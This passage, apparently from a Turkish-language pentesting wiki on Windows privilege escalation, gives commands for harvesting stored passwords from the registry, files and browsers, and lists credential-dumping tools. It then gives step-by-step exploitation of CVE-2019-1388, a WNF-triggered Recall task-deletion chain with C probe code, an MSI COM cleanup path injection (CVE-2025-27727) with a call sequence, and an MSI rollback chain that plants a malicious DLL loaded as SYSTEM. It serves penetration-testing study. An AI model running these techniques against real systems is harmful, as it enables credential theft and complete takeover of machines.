Kimlik bilgilerine dair ipuçları için erişilebilir mesajlaşma istemcisi profili veritabanlarını, notları ve alınan dosyaları da inceleyin. BitLocker kurtarma dışa aktarımı HTML veya TXT olarak, bazen adı belirli bir yedekleme arşivinin içinde saklanmış olabilir. Bu tür materyaller, eski yedekleri içeren ayrı bir şifreli veri birimine erişim sağlayabilir; birimi ve arşivi yalnızca erişim yetkiniz varsa inceleyin. Bir yedek `NTDS.dit` içeriyorsa, çevrimdışı etki alanı kimlik bilgisi kurtarma için [yedekleme ve ayrıcalıklı gruplar iş akışında](../active-directory-methodology/privileged-groups-and-token-privileges.md) açıklandığı gibi eşleşen `SYSTEM` hive'ı da gerekir. Dosya adları ve kilitli bir birim, kullanılabilir bir kurtarma anahtarının veya etki alanı yedeğinin mevcut olduğunu tek başına kanıtlamaz.

Birçok programda kayıtlı **parolaları kurtarmak** için şunu kullanabilirsiniz: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Registry içinde

**Kimlik bilgileri içerebilecek diğer registry anahtarları**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Registry'den OpenSSH anahtarlarını çıkarma.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Tarayıcı Geçmişi

**Chrome veya Firefox** parolalarının saklandığı veritabanlarını kontrol etmelisiniz.\
**Chrome, Edge veya Firefox** parolalarının saklandığı veritabanlarını kontrol etmelisiniz.\
Ayrıca tarayıcıların geçmişini, yer işaretlerini ve sık kullanılanlarını da kontrol edin; parolalar buralarda saklanıyor olabilir.

Geçerli kullanıcının standart Edge **Default** profili için `Login Data`, `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default` konumundadır; `Local State` ise bunun üst dizini olan `User Data` dizinindedir. [Microsoft varsayılan profil konumunu belgeler](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); başka bir profil veya `UserDataDir` ilkesi bu konumu değiştirebilir. Dosyaların mevcut olması yalnızca kimlik bilgisi deposuna dair bir ipucudur: okunabilir dosyaları, ilgili kullanıcının DPAPI bağlamını veya izinli başka anahtar materyallerini ve kaydedilmiş bir oturum açma bilgisinin daha ayrıcalıklı bir hesaba ait olup olmadığını doğrulayın. Yalnızca yolları listelemek için veritabanını açmak veya şifresi çözülmüş parolaları yazdırmak gerekmez.

Firefox için [Mozilla, bir profilin `key4.db` ve `logins.json` dosyalarının eşleşen anahtar ve şifrelenmiş oturum açma dosyaları olduğunu belgeler](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile). Bu dosyaların mevcut olması yalnızca bir ipucudur: her iki dosyanın da okunabilir olup olmadığını, kaydedilmiş girdilerin bulunup bulunmadığını ve kimlik bilgilerinin kullanılabilir olduğu sonucuna varmadan önce anahtarın bir Primary Password ile korunup korunmadığını kontrol edin. Kurtarılan bir kimlik bilgisi etki alanı hesabına aitse, o hesabın etkin grup denetimi izinlerini ve grubun [LAPS parola okuma veya şifre çözme izinlerini](../active-directory-methodology/laps.md) ayrı ayrı inceleyin; tarayıcı kalıntıları tek başına bir yönetici erişim yolu olduğunu kanıtlamaz.

Tarayıcılardan parola çıkarmaya yarayan araçlar:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)**, farklı dillerdeki yazılım bileşenleri arasında **iletişim** kurulmasını sağlayan, Windows işletim sisteminde yerleşik bir teknolojidir. Her COM bileşeni bir **sınıf kimliği (CLSID) ile tanımlanır** ve her bileşen, arayüz kimlikleriyle (IID'ler) tanımlanan bir veya daha fazla arayüz aracılığıyla işlevsellik sunar.

COM sınıfları ve arayüzleri sırasıyla kayıt defterinde **HKEY\CLASSES\ROOT\CLSID** ve **HKEY\CLASSES\ROOT\Interface** altında tanımlanır. Bu kayıt defteri, **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** birleştirilerek oluşturulur = **HKEY\CLASSES\ROOT.**

Bu kayıt defterinin CLSID'leri içinde, **DLL**'yi gösteren bir **varsayılan değer** ve **ThreadingModel** adlı bir değer içeren **InProcServer32** alt kayıt defterini bulabilirsiniz. **ThreadingModel** değeri **Apartment** (Tek İş Parçacıklı), **Free** (Çok İş Parçacıklı), **Both** (Tek veya Çok İş Parçacıklı) ya da **Neutral** (İş Parçacığından Bağımsız) olabilir.

![Tarayıcı Geçmişi - COM DLL Overwriting: Bu kayıt defterinin CLSID'leri içinde, DLL'yi gösteren bir varsayılan değer ve bir değer... içeren InProcServer32 alt kayıt defterini bulabilirsiniz.](<../../images/image (729).png>)

Temel olarak, çalıştırılacak **DLL'lerden herhangi birinin üzerine yazabilirseniz**, bu DLL başka bir kullanıcı tarafından çalıştırıldığında **yetki yükseltebilirsiniz**.

Saldırganların COM Hijacking'i kalıcılık mekanizması olarak nasıl kullandığını öğrenmek için şuraya bakın:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Dosyalarda ve kayıt defterinde genel parola araması**

**Dosya içeriklerinde arama yapın**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Belirli bir dosya adına sahip dosyayı arama**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Key adları ve parolalar için registry’de arama yapın**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Parolaları arayan araçlar

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **bir msf** plugin'idir. Bu plugin'i, kurbanın içinde kimlik bilgilerini arayan her Metasploit POST module'ünü **otomatik olarak çalıştırmak** için oluşturdum.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) bu sayfada bahsedilen parolaları içeren tüm dosyaları otomatik olarak arar.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) bir sistemden parola çıkarmak için kullanılan başka bir harika araçtır.

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) bu verileri düz metin olarak kaydeden çeşitli araçların **oturumlarını**, **kullanıcı adlarını** ve **parolalarını** arar (PuTTY, WinSCP, FileZilla, SuperPuTTY ve RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Şunu hayal edin: **SYSTEM olarak çalışan bir process**, **tam erişimle** yeni bir process açıyor (`OpenProcess()`). Aynı process, **ana process'in tüm açık handle'larını devralan ancak düşük ayrıcalıklarla çalışan** yeni bir process de oluşturuyor (`CreateProcess()`).\
Ardından, **düşük ayrıcalıklı process'e tam erişiminiz varsa**, `OpenProcess()` ile oluşturulan **ayrıcalıklı process'in açık handle'ını** alabilir ve **shellcode inject edebilirsiniz**.\
[Bu zafiyetin **nasıl tespit edilip exploit edileceği** hakkında daha fazla bilgi için bu örneği okuyun.](leaked-handle-exploitation.md)\
[Farklı izin düzeyleriyle devralınan process ve thread'lerin diğer açık handle'larını nasıl test edip kötüye kullanabileceğiniz (yalnızca tam erişimle sınırlı olmadan) hakkında daha kapsamlı bir açıklama için bu **diğer yazıyı okuyun**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

**Pipe** olarak adlandırılan paylaşılan bellek segmentleri, process'ler arasında iletişim ve veri aktarımını sağlar.

Windows, ilgisiz process'lerin farklı ağlar üzerinden bile veri paylaşmasına olanak tanıyan **Named Pipes** adlı bir özellik sunar. Bu, rolleri **named pipe server** ve **named pipe client** olarak tanımlanan bir client/server mimarisine benzer.

Bir **client** pipe üzerinden veri gönderdiğinde, pipe'ı kuran **server**, gerekli **SeImpersonate** haklarına sahip olması koşuluyla **client'ın kimliğine bürünebilir**. Taklit edebileceğiniz bir pipe üzerinden iletişim kuran **ayrıcalıklı bir process** tespit etmek, kurduğunuz pipe ile etkileşime girdiğinde o process'in kimliğine bürünerek **daha yüksek ayrıcalıklar elde etme** fırsatı sunar. Böyle bir saldırıyı gerçekleştirme talimatları için [**buradaki**](named-pipe-client-impersonation.md) ve [**buradaki**](#from-high-integrity-to-system) faydalı kılavuzlara bakabilirsiniz.

Ayrıca aşağıdaki araç, **burp gibi bir araçla named pipe iletişimini yakalamanızı sağlar:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **ve bu araç, privescs bulmak için tüm pipe'ları listeleyip görüntülemenizi sağlar:** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv uzaktan DWORD yazma ile RCE

Sunucu modundaki Telephony service (TapiSrv), `\\pipe\\tapsrv` (MS-TRP) yolunu kullanıma açar. Uzaktan bağlanan kimliği doğrulanmış bir client, mailslot tabanlı async event yolunu kötüye kullanarak `ClientAttach` işlemini, `NETWORK SERVICE` tarafından yazılabilen mevcut herhangi bir dosyaya rastgele **4-byte yazma** işlemine dönüştürebilir; ardından Telephony admin haklarını elde edip service olarak rastgele bir DLL yükleyebilir. Tam akış:

- `pszDomainUser` değerini yazılabilir mevcut bir yola ayarlayarak `ClientAttach` çağrısı yapın → service, bu yolu `CreateFileW(..., OPEN_EXISTING)` aracılığıyla açar ve async event yazımları için kullanır.
- Her event, `Initialize` içindeki saldırgan denetimindeki `InitContext` değerini bu handle'a yazar. `LRegisterRequestRecipient` (`Req_Func 61`) ile bir line app kaydedin, `TRequestMakeCall` (`Req_Func 121`) çağrısını tetikleyin, `GetAsyncEvents` (`Req_Func 0`) ile veriyi alın, ardından deterministik yazımları tekrarlamak için kaydı kaldırıp service'i kapatın.
- `C:\Windows\TAPI\tsec.ini` içindeki `[TapiAdministrators]` grubuna kendinizi ekleyin, yeniden bağlanın ve ardından `NETWORK SERVICE` olarak `TSPI_providerUIIdentify` çalıştırmak için rastgele bir DLL yoluyla `GetUIDllName` çağrısı yapın.

Daha fazla ayrıntı:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Çeşitli

### Windows'ta kod çalıştırabilecek dosya uzantıları

**[https://filesec.io/](https://filesec.io/)** sayfasına göz atın.

### Markdown renderers üzerinden Protocol handler / ShellExecute kötüye kullanımı

`ShellExecuteExW`'ye iletilen tıklanabilir Markdown bağlantıları, tehlikeli URI handler'larını (`file:`, `ms-appinstaller:` veya kayıtlı herhangi bir scheme) tetikleyebilir ve geçerli kullanıcı olarak saldırgan denetimindeki dosyaları çalıştırabilir. Şuraya bakın:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Parolalar için Command Line'ları izleme**

Bir kullanıcı olarak shell aldığınızda, **kimlik bilgilerini command line üzerinden aktaran** zamanlanmış görevler veya çalışan başka process'ler olabilir. Aşağıdaki script, process command line'larını iki saniyede bir yakalar ve mevcut durumu önceki durumla karşılaştırarak değişiklikleri görüntüler.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Süreçlerden parola çalma

## Düşük ayrıcalıklı kullanıcıdan NT\AUTHORITY SYSTEM'e (CVE-2019-1388) / UAC Bypass

Grafik arayüze (konsol veya RDP üzerinden) erişiminiz varsa ve UAC etkinse, Microsoft Windows'un bazı sürümlerinde ayrıcalıksız bir kullanıcıdan terminali veya "NT\AUTHORITY SYSTEM" gibi başka herhangi bir süreci çalıştırmak mümkündür.

Bu sayede aynı güvenlik açığını kullanarak hem ayrıcalıkları yükseltmek hem de UAC'yi atlatmak mümkün olur. Ayrıca hiçbir şey yüklemek gerekmez ve işlem sırasında kullanılan binary, Microsoft tarafından imzalanmış ve yayımlanmıştır.

Etkilenen sistemlerden bazıları şunlardır:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Bu güvenlik açığından yararlanmak için aşağıdaki adımları gerçekleştirmek gerekir:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Gerekli tüm dosyalara ve bilgilere şu GitHub deposundan ulaşabilirsiniz:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Administrator Medium'dan High Integrity Level'a / UAC Bypass

**Integrity Levels** hakkında bilgi edinmek için bunu okuyun:


{{#ref}}
integrity-levels.md
{{#endref}}

Ardından **UAC ve UAC bypasses** hakkında bilgi edinmek için bunu okuyun:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Sunulan Bir Kök Dizine Upload Directory Junction'ları

Bir uygulama tahmin edilebilir bir upload alt dizini oluşturabilir, çağıranın sağladığı dosya adını bu dizine yazabilir ve ardından dosyayı işleyebilir. Düşük ayrıcalıklı bir kullanıcı, sunucu tarafındaki yazma işleminden önce bu alt dizini kaldırıp yerine bir NTFS junction koyabiliyorsa, yazma işlemi junction'ı izleyerek web sunucusunun sunduğu bir dizine yönlenebilir. Sunucu bu dosya türünü çalıştırıyorsa, buraya yerleştirilen bir script web hizmetinin kimliğiyle çalışabilir. Bu, uygulamaya özgü bir keyfi yazma sınırıdır; yalnızca yazılabilir bir upload dizininin veya mevcut bir junction'ın bulunması bunu kanıtlamaz.

Upload handler'daki yol oluşturma mantığını ve zamanlamayı, kullanıcının alt dizindeki etkili silme/oluşturma izinlerini, hedefin etkili ACL'lerini, yazma işlemini yapanın reparse point'leri izleyip izlemediğini ve web sunucusunun hedefteki dosyaları çalıştırıp çalıştırmadığını kontrol edin. Yazma işlemini yapan sürecin ve web sunucusunun kimliklerini ayrı ayrı doğrulayın. Pasif envanter çıkarma, dizin ACL'lerini ve reparse metadata'sını gösterebilir; ancak handler'ın davranışını veya gelecekte yapılacak bir junction değişimini ortaya koyamaz. Çalıştırma bir hizmet hesabı altında gerçekleşirse, ayrı bir token-privilege yolunu değerlendirmeden önce **gerçek process token'ını** inceleyin.

## WNF tarafından tetiklenen ayrıcalıklı scheduled-task temizliği

Elle çalıştırılması engellenen bir scheduled task yine de ayrıcalıksız bir tetikleyici sunabilir. Ayrıcalıklı bir task'ı denetlerken XML'ini dışa aktarın ve task DACL'inin, principal'ının ve action'ının yanı sıra **tüm** tetikleyicilerini de inceleyin. Özellikle `WnfStateChangeTrigger`, bir Windows Notification Facility (WNF) state'i belirtir; bu güvenli state mevcut kullanıcının güncelleme yayımlamasına izin veriyorsa, kullanıcı `<AllowStartOnDemand>false</AllowStartOnDemand>` ayarına rağmen task'ı yapılandırılmış kimliğiyle dolaylı olarak başlatabilir.<sup>[[43]](#references)</sup>

Örneğin Recall `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` task'ı SYSTEM olarak çalışıyor, standart bir kullanıcının WNF state `7508BCA32C079E41` için güncelleme göndermesini kabul ediyor ve Recall devre dışı olsa bile `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}` yolunu inceliyordu.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Erişilebilirliği test etmek için `ZwUpdateWnfStateData` işlevini `ntdll.dll` içinden resolve edin, sekiz baytlık durum adı için boş bir güncelleme gönderin ve dönüş durumunu görevin son çalıştırılma verileriyle veya Procmon etkinliğiyle ilişkilendirin. Aşağıdaki basitleştirilmiş probe, Recall task örneğindeki bayt dizisini kullanır; test edilen görev için dışa aktarılan baytları kullanın.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Özyinelemeli temizliği ayrıcalıklı silme işlemine dönüştürme

İşe yarayan primitive yalnızca tetikleyici değil, saldırganın kontrolündeki bir dizini kabul eden ayrıcalıklı temizleme yordamıdır. İşlemi, listelemeden son değişikliğe kadar izleyin: profil/oturum keşfi, joker karakterle seçilen alt öğeler, `SHCreateItemFromParsingName` ve `IFileOperation::DeleteItem`, daha önce kontrol edilmiş bir yol adının daha sonra özyinelemeli olarak gezileceğini gösteren güçlü işaretlerdir. Alt öğeler güvenilir dizin tanıtıcılarına göre açılıp silinmeden önce doğrulanmıyorsa saldırgan, listeleme ile kullanım arasında yol çözümlemesini değiştirebilir.<sup>[[43]](#references)</sup>

WNF tetikleyicisini aşağıda açıklanan [oplock, junction ve Object Manager symlink substitution](#from-folder-contents-delete-to-system-eop) tekniğiyle eşleştirin: oplock, temizleyiciyi meşru alt öğeyi seçtikten sonra duraklatırken yazılabilir üst dizin değiştirilir; böylece ayrıcalıklı silme devam ettiğinde `\RPC Control` üzerinden korunan hedefe çözümleme yapılır. Recall zincirinde bu, belgelenmiş MSI rollback tekniği için gereken `C:\Config.Msi` dizininin SYSTEM tarafından silinmesini sağladı.<sup>[[31]](#references)[[43]](#references)</sup>

### İç içe alt öğeler, yüzeysel reparse point düzeltmelerini aşar

Yalnızca saldırganın kontrolündeki kökü ve doğrudan alt öğesini doğrulamak, yol adına dayalı özyinelemeli silme işlemini güvenli hâle getirmez. Bu kontrol edilen nesneleri meşru durumda tutup junction/oplock substitution işlemini bunların altındaki ek bir alt öğeye taşıyın; `IFileOperation::DeleteItem` sonunda doğrulanmamış alt öğeye ulaşır ve onun yeni hedefini izler. CVE-2026-20941, ilk Recall yaması `UKP` ile GUID biçimindeki dizini doğrulasa da eski özyinelemeli silme işlemini koruduğundan, bu eksik düzeltme sınıfının tam bir örneğidir.<sup>[[43]](#references)</sup>

Güvenli yaklaşım, **her alt öğeyi** önceden güvenilen bir dizin tanıtıcısına göre açmak, nihai çözümlenmiş yolu/nesneyi alıp doğrulamak ve silme disposition'ını doğrulanmış tanıtıcıya uygulamaktır. Bir öneki doğrulayıp sonra yol adına dayalı özyinelemeli silmeye geri dönmeyin. Yama incelemesi sırasında gerçek çağrı noktasındaki yapıları da inceleyin: bu durumda `NtCreateFile` içindeki `OBJECT_ATTRIBUTES` yapısının çalışma zamanı incelemesi, `RootDirectory` alanının null olmadığını ve `{GUID}\\secure_file.lock` adının göreli olduğunu göstererek, `FILE_DELETE_ON_CLOSE` için ikinci bir primitive olduğunu öne süren yanıltıcı decompiler çıktısını çürüttü.<sup>[[43]](#references)</sup>

## Herhangi Bir Klasörü Silme/Taşıma/Yeniden Adlandırma ile SYSTEM EoP

Bu teknik, [**bu blog gönderisinde**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) anlatılmıştır; exploit koduna [**buradan**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs) ulaşılabilir.<sup>[[31]](#references)[[32]](#references)</sup>

Saldırı, Windows Installer'ın rollback özelliğini kötüye kullanarak kaldırma işlemi sırasında meşru dosyaları zararlı dosyalarla değiştirmekten ibarettir. Bunun için saldırganın, `C:\Config.Msi` klasörünü ele geçirmek üzere kullanılacak **zararlı bir MSI installer** oluşturması gerekir. Bu klasör daha sonra Windows Installer tarafından diğer MSI paketlerinin kaldırılması sırasında rollback dosyalarını depolamak için kullanılır; bu dosyalar da zararlı payload içerecek şekilde değiştirilir.

### Windows Installer COM temizleme yolu enjeksiyonu (CVE-2025-27727)

Düşük ayrıcalıklı bir istemci, `CMsiConfigurationManager` COM nesnesi (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`) üzerinden SYSTEM yetkileriyle çalışan `msiexec.exe` hizmetine erişebilir. Tersine mühendislik, ilgili `IMsiServer` çağrılarının vtable'daki `0xA0` konumundaki `MsiBeginTransactionW`, `0xC8` konumundaki `SetEEUIDirectoryAndFilter` ve `0x50` konumundaki `CleanupTempPackages` olduğunu ortaya çıkardı. Bu adlar ve konumlar tersine mühendislikle belirlenmiştir ve derlemeler arasında değişebilir.<sup>[[41]](#references)</sup>

Yönetici olmayan kullanıcılar için `SetEEUIDirectoryAndFilter`, sağlanan yolu `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` ve `FILE_FLAG_OPEN_REPARSE_POINT` ile açarken çağıranı taklit eder. Bu, çağıranın dizini silebildiğini kanıtlar ve bir reparse point'in izlenmesini önler; ancak kontrol edilen dosya nesnesini sonraki temizleme işlemine bağlamaz veya dosyanın Windows Installer tarafından oluşturulduğunu kanıtlamaz.<sup>[[41]](#references)</sup>

`MsiBeginTransactionW` sonrasında `SetEEUIDirectoryAndFilter`, çağıranın filter argümanından bağımsız olarak yolu klasör olarak zamanlar. Hizmet, `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages` altında adlandırılmış bir `REG_DWORD` değeri yazar: değer adı çağıranın kontrolündeki yol, `0x00000002` verisi ise klasör bayrağıdır. Ardından `CleanupTempPackages(NULL, FALSE)` doğrudan temizleme işlemine girer. Yükseltilmiş yetkilerle çalışan worker, kayıt defteri değerlerini listeler ve klasör girdilerini yolun kaynağını denetlemeden özyinelemeli `FDeleteFolder` yordamına iletir. Normal silme başarısız olursa kod ayrıca `LockdownPath` çağrısı yapar, dosya özniteliklerini temizler ve yeniden dener.<sup>[[41]](#references)</sup>

`msi.dll` dosyasından elde edilen asgari çağrı sırası şöyledir:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Kullanışlı primitive, junction yönlendirmesi değil, path reuse'dur. Saldırganın oluşturduğu `C:\Config.Msi` yolunu kaydedin, silin ve Windows Installer'ın daha sonra korumalı rollback verileriyle aynı pathname'i yeniden oluşturmasını sağlayın. Cleanup, eski `TempPackages` adına güvenerek yeni dizini SYSTEM olarak siler. Reparse point gerekmediğinden, bu yöntem `FILE_FLAG_OPEN_REPARSE_POINT` ve redirection-trust mitigation ile amaçlanan sınırı aşar.<sup>[[41]](#references)</sup>

Bu silme primitive'i aşağıdaki rollback zincirine uyar: ayrı `Installer\Folders` kaydını koruyun, korumalı `C:\Config.Msi` dizinini silin, NULL DACL ile yeniden oluşturun ve installer DACL'yi sıkılaştırmadan önce `WRITE_DAC` verilmiş bir handle tutun. Önceden açılmış handle, `NtSetSecurityObject` ile izin veren bir DACL'yi geri yükleyebilir; ardından rollback devam etmeden önce oluşturulan `.rbs` değiştirilebilir.<sup>[[41]](#references)</sup>

Microsoft, yeni feature gate etkinleştirildiğinde `CMsiTransaction::SetEEUIDirectoryAndFilter` metodunun `ScheduleFileOrFolderDelete` çağırmasını engelleyerek bu path sorununu düzeltti. COM çağrısı yine de başarı döndürebilir, ancak saldırganın kontrolündeki path'i artık `TempPackages` içine eklemez. Yama testi olarak metodun başarıyla dönmesini kullanmak yerine April 2025 Windows security updates güncellemelerini yükleyin.<sup>[[41]](#references)[[42]](#references)</sup>

Tekniğin özeti şöyledir:

1. **Aşama 1 – Hijack için Hazırlık (`C:\Config.Msi` boş bırakılır)**

- Adım 1: MSI'ı yükleyin
    - Yazılabilir bir klasöre (`TARGETDIR`) zararsız bir dosya (ör. `dummy.txt`) yükleyen bir `.msi` oluşturun.
    - **Admin olmayan bir kullanıcının** çalıştırabilmesi için installer'ı **"UAC Compliant"** olarak işaretleyin.
    - Kurulumdan sonra dosyaya açık bir **handle** tutun.

- Adım 2: Uninstall işlemini başlatın
    - Aynı `.msi` dosyasını uninstall edin.
    - Uninstall işlemi dosyaları `C:\Config.Msi` dizinine taşımaya ve `.rbf` dosyaları (rollback yedekleri) olarak yeniden adlandırmaya başlar.
    - Dosyanın `C:\Config.Msi\<random>.rbf` haline geldiğini algılamak için açık dosya handle'ını `GetFinalPathNameByHandle` kullanarak **poll edin**.

- Adım 3: Özel senkronizasyon
    - `.msi`, aşağıdakileri yapan bir **özel uninstall action (`SyncOnRbfWritten`)** içerir:
        - `.rbf` yazıldığında sinyal gönderir.
        - Ardından uninstall işlemine devam etmeden önce başka bir event'i **bekler**.

- Adım 4: `.rbf` dosyasının silinmesini engelleyin
    - Sinyal geldiğinde, `.rbf` dosyasını `FILE_SHARE_DELETE` olmadan **açın** — bu, **silinmesini engeller**.
    - Ardından uninstall işleminin bitmesi için **geri sinyal gönderin**.
    - Windows Installer `.rbf` dosyasını silemez; tüm içeriği silemediği için **`C:\Config.Msi` kaldırılmaz**.

- Adım 5: `.rbf` dosyasını elle silin
    - `.rbf` dosyasını elle silin (saldırgan olarak).
    - Artık **`C:\Config.Msi` boştur** ve hijack edilmeye hazırdır.

> Bu noktada, `C:\Config.Msi` dizinini silmek için **SYSTEM seviyesinde arbitrary folder delete vulnerability**'yi tetikleyin.

2. **Aşama 2 – Rollback Script'lerini Kötücül Olanlarla Değiştirme**

- Adım 6: `C:\Config.Msi` dizinini zayıf ACL'lerle yeniden oluşturun
    - `C:\Config.Msi` klasörünü kendiniz yeniden oluşturun.
    - **Zayıf DACL'ler** (ör. Everyone:F) ayarlayın ve `WRITE_DAC` içeren bir handle'ı açık **tutun**.

- Adım 7: Başka bir install işlemi çalıştırın
    - `.msi` dosyasını tekrar yükleyin; şu değerleri kullanın:
        - `TARGETDIR`: Yazılabilir bir konum.
        - `ERROROUT`: Zorunlu bir hatayı tetikleyen bir değişken.
    - Bu install işlemi, `.rbs` ve `.rbf` dosyalarını okuyan **rollback** işlemini yeniden tetiklemek için kullanılacaktır.

- Adım 8: `.rbs` dosyasını izleyin
    - Yeni bir `.rbs` görünene kadar `C:\Config.Msi` dizinini izlemek için `ReadDirectoryChangesW` kullanın.
    - Dosya adını kaydedin.

- Adım 9: Rollback öncesinde senkronizasyon yapın
    - `.msi`, aşağıdakileri yapan bir **özel install action (`SyncBeforeRollback`)** içerir:
        - `.rbs` oluşturulduğunda bir event'e sinyal gönderir.
        - Ardından devam etmeden önce bekler.

- Adım 10: Zayıf ACL'leri yeniden uygulayın
    - `.rbs created` event'ini aldıktan sonra:
        - Windows Installer, `C:\Config.Msi` için **güçlü ACL'leri yeniden uygular**.
        - Ancak hâlâ `WRITE_DAC` içeren bir handle'ınız olduğundan **zayıf ACL'leri yeniden uygulayabilirsiniz**.

> ACL'ler **yalnızca handle açılırken denetlenir**; dolayısıyla klasöre yazmaya devam edebilirsiniz.

- Adım 11: Sahte `.rbs` ve `.rbf` dosyalarını bırakın
    - `.rbs` dosyasını, Windows'a şunu yaptıran **sahte bir rollback script** ile değiştirin:
        - `.rbf` dosyanızı (kötücül DLL) **ayrıcalıklı bir konuma** (ör. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`) geri yüklemek.
    - **SYSTEM seviyesinde kötücül bir payload DLL** içeren sahte `.rbf` dosyanızı bırakın.

- Adım 12: Rollback işlemini tetikleyin
    - Installer'ın devam etmesi için senkronizasyon event'ine sinyal gönderin.
    - **Type 19 custom action (`ErrorOut`)**, kurulumu bilinen bir noktada **kasten başarısız kılacak** şekilde yapılandırılmıştır.
    - Bu, **rollback işlemini başlatır**.

- Adım 13: SYSTEM DLL'inizi yükler
    - Windows Installer:
        - Kötücül `.rbs` dosyanızı okur.
        - `.rbf` DLL'inizi hedef konuma kopyalar.
    - Artık **SYSTEM tarafından yüklenen bir path'te kötücül DLL'iniz vardır**.

- Son adım: SYSTEM kodunu çalıştırın
    - Hijack ettiğiniz DLL'i yükleyen, güvenilir ve **otomatik yükseltilen bir binary** (ör. `osk.exe`) çalıştırın.
